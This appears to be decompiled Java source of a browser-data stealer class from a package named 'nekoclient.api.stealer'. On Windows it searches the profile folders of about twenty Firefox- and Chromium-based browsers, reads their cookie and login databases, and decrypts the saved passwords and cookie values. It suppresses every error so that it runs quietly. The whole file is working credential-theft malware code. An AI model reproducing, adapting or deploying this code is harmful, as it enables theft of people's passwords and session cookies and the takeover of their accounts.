package dev.neko.nekoclient.api.stealer.browser.impl;

import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonArray;
import com.eclipsesource.json.JsonObject;
import com.eclipsesource.json.JsonValue;
import com.eclipsesource.json.ParseException;
import com.sun.jna.Platform;
import dev.neko.nekoclient.api.stealer.browser.BrowserData;
import dev.neko.nekoclient.api.stealer.browser.cookie.Cookie;
import dev.neko.nekoclient.api.stealer.browser.impl.credential.Credential;
import dev.neko.nekoclient.api.stealer.browser.impl.decrypt.chrome.ChromeDecryptor;
import dev.neko.nekoclient.api.stealer.browser.impl.decrypt.mozilla.MozillaDecryptor;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Base64;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class BrowserDataStealer {
   public static BrowserData read() {
      BrowserData browserData = new BrowserData();
      if (!Platform.isWindows()) {
         return browserData;
      } else {
         readMozillaSafely(browserData, Paths.get(System.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"));
         readMozillaSafely(browserData, Paths.get(System.getenv("APPDATA"), "Waterfox", "Profiles"));
         readMozillaSafely(browserData, Paths.get(System.getenv("APPDATA"), "Pale Moon", "Profiles"));
         readMozillaSafely(browserData, Paths.get(System.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "Slimjet", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "Iridium", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("LOCALAPPDATA"), "UCBrowser", "User Data"));
         readChromiumSafely(browserData, Paths.get(System.getenv("APPDATA"), "Opera Software", "Opera Beta"));
         readChromiumSafely(browserData, Paths.get(System.getenv("APPDATA"), "Opera Software", "Opera Developer"));
         readChromiumSafely(browserData, Paths.get(System.getenv("APPDATA"), "Opera Software", "Opera Stable"));
         readChromiumSafely(browserData, Paths.get(System.getenv("APPDATA"), "Opera Software", "Opera GX Stable"));
         readChromiumSafely(browserData, Paths.get(System.getenv("APPDATA"), "Opera Software", "Opera Crypto Stable"));
         readChromiumSafely(browserData, Paths.get(System.getenv("APPDATA"), "CryptoTab Browser", "User Data"));
         return browserData;
      }
   }

   public static void readMozillaSafely(BrowserData browserData, Path profilesDirectory) {
      try {
         readMozilla(browserData, profilesDirectory);
      } catch (Throwable var3) {
      }
   }

   public static void readMozilla(BrowserData browserData, Path profilesDirectory) throws IOException {
      if (Files.exists(profilesDirectory)) {
         for(Path profile : Files.walk(profilesDirectory, 1).filter(path -> !Objects.equals(path, profilesDirectory)).collect(Collectors.toList())) {
            Path cookiesFile = profile.resolve("cookies.sqlite");
            if (Files.isRegularFile(cookiesFile) && Files.isReadable(cookiesFile)) {
               try {
                  Connection connection = DriverManager.getConnection(String.format("jdbc:sqlite:%s", cookiesFile.toAbsolutePath()));
                  Statement statement = connection.createStatement();
                  ResultSet resultSet = statement.executeQuery("SELECT * FROM moz_cookies");

                  while(resultSet.next()) {
                     browserData.addCookie(
                        new Cookie(
                           resultSet.getString("host"),
                           resultSet.getString("path"),
                           resultSet.getString("name"),
                           resultSet.getString("value"),
                           (long)resultSet.getInt("expiry") * 1000L,
                           Objects.equals(resultSet.getInt("isSecure"), 1),
                           Objects.equals(resultSet.getInt("isHttpOnly"), 1)
                        )
                     );
                  }

                  resultSet.close();
                  statement.close();
                  connection.close();
               } catch (SQLException var12) {
               }
            }

            Path loginsFile = profile.resolve("logins.json");
            if (Files.isRegularFile(loginsFile) && Files.isReadable(loginsFile) && MozillaDecryptor.isSupported()) {
               MozillaDecryptor mozillaDecryptor = new MozillaDecryptor();
               mozillaDecryptor.init(profile);

               try {
                  JsonObject data = Json.parse(Files.newBufferedReader(loginsFile)).asObject();
                  if (Objects.nonNull(data.get("logins"))) {
                     JsonArray logins = data.get("logins").asArray();

                     for(JsonObject login : logins.values().stream().map(JsonValue::asObject).collect(Collectors.toList())) {
                        browserData.addCredential(
                           new Credential(
                              new URL(login.get("hostname").asString()),
                              mozillaDecryptor.decrypt(Base64.getDecoder().decode(login.get("encryptedUsername").asString())),
                              mozillaDecryptor.decrypt(Base64.getDecoder().decode(login.get("encryptedPassword").asString()))
                           )
                        );
                     }
                  }
               } catch (IOException | ParseException var13) {
               }

               mozillaDecryptor.shutdown();
            }
         }
      }
   }

   public static void readChromiumSafely(BrowserData browserData, Path userData) {
      try {
         readChromium(browserData, userData);
      } catch (Throwable var3) {
      }
   }

   public static void readChromium(BrowserData browserData, Path userData) throws IOException, NoSuchPaddingException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, InvalidKeyException {
      if (Files.exists(userData) && ChromeDecryptor.isSupported()) {
         JsonObject localState = Json.parse(new InputStreamReader(Files.newInputStream(userData.resolve("Local State")))).asObject();
         List<String> profiles = Objects.isNull(localState.get("profile"))
            ? Collections.singletonList(".")
            : localState.get("profile").asObject().get("info_cache").asObject().names();
         ChromeDecryptor chromeDecryptor = new ChromeDecryptor(
            Base64.getDecoder().decode(localState.get("os_crypt").asObject().get("encrypted_key").asString())
         );

         for(String profile : profiles) {
            Path cookiesFile = userData.resolve(profile).resolve("Network").resolve("Cookies");
            if (Files.isRegularFile(cookiesFile) && Files.isReadable(cookiesFile)) {
               try {
                  Connection connection = DriverManager.getConnection(String.format("jdbc:sqlite:%s", cookiesFile.toAbsolutePath()));
                  Statement statement = connection.createStatement();
                  ResultSet resultSet = statement.executeQuery("SELECT * FROM cookies");

                  while(resultSet.next()) {
                     Cookie cookie = new Cookie(
                        resultSet.getString("host_key"),
                        resultSet.getString("path"),
                        resultSet.getString("name"),
                        chromeDecryptor.decrypt(resultSet.getBytes("encrypted_value")),
                        resultSet.getLong("expires_utc") / 1000L,
                        Objects.equals(resultSet.getInt("is_secure"), 1),
                        Objects.equals(resultSet.getInt("is_httponly"), 1)
                     );
                     browserData.addCookie(cookie);
                  }

                  resultSet.close();
                  statement.close();
                  connection.close();
               } catch (SQLException var16) {
               }
            }

            Path loginDataFile = userData.resolve(profile).resolve("Login Data");
            if (Files.isRegularFile(loginDataFile) && Files.isReadable(loginDataFile) && ChromeDecryptor.isSupported()) {
               try {
                  Connection connection = DriverManager.getConnection(String.format("jdbc:sqlite:%s", loginDataFile.toAbsolutePath()));
                  Statement statement = connection.createStatement();
                  ResultSet resultSet = statement.executeQuery("SELECT * FROM logins");

                  while(resultSet.next()) {
                     String originUrl = resultSet.getString("origin_url");
                     String username = resultSet.getString("username_value");
                     byte[] password = resultSet.getBytes("password_value");
                     if (!originUrl.isEmpty() && !username.isEmpty() && password.length != 0) {
                        Credential credential = new Credential(new URL(originUrl), username, chromeDecryptor.decrypt(password));
                        browserData.addCredential(credential);
                     }
                  }

                  resultSet.close();
                  statement.close();
                  connection.close();
               } catch (SQLException var17) {
               }
            }
         }
      }
   }

   static {
      try {
         Class.forName("org.sqlite.JDBC");
      } catch (ClassNotFoundException var1) {
      }
   }
}
